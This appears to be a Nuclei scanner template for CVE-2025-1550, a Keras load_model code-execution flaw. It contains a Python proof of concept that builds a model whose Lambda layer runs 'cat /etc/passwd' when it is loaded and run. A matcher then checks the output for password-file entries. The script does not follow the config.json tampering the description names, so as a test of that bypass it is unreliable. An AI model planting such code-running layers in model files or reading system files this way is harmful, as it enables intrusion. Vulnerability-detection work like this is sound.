id: CVE-2025-1550

info:
  name: "Keras Model.load_model RCE (CVE-2025-1550)"
  author: nukunga[seunghyeonJeon]
  severity: critical
  description: |
    The Keras Model.load_model function permits arbitrary code execution, even with safe_mode=True,
    through a manually constructed, malicious .keras archive. By altering the config.json file within
    the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments,
    to be loaded and executed during model loading.
  reference:
    - "https://nvd.nist.gov/vuln/detail/CVE-2025-1550"
    - "https://github.com/keras-team/keras/pull/20751"
    - "https://towerofhanoi.it/writeups/cve-2025-1550/"
  classification:
    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
    cve-id: "CVE-2025-1550"
    cwe-id: "CWE-94"
  tags: cve,cve2025,keras,rce,code-injection,ml,python

self-contained: true

code:
  - engine:
      - py
      - python3

    source: |
      #!/usr/bin/env python3
      import os
      import sys

      try:
          import tensorflow as tf
          from tensorflow.keras.models import load_model
          from tensorflow.keras.layers import Lambda, Input
          from tensorflow.keras.models import Model
          import numpy as np
      except ImportError:
          sys.exit(1)

      def create_malicious_model():
          def malicious_function(x):
              result = os.popen("cat /etc/passwd").read()
              print(result)
              return x

          input_layer = Input(shape=(1,))
          lambda_layer = Lambda(malicious_function, name="evil_lambda")(input_layer)
          model = Model(inputs=input_layer, outputs=lambda_layer)
          return model

      def exploit_lambda_layer():
          model_path = "/tmp/malicious_model.keras"
          try:
              model = create_malicious_model()
              model.save(model_path)
              del model

              loaded_model = load_model(model_path)
              test_input = np.array([[1.0]])
              loaded_model.predict(test_input, verbose=0)

              return True
          except:
              return False
          finally:
              if os.path.exists(model_path):
                  os.remove(model_path)

      exploit_lambda_layer()

    matchers:
      - type: word
        part: response
        words:
          - "root:"
          - "bin:"
          - "daemon:"
        condition: or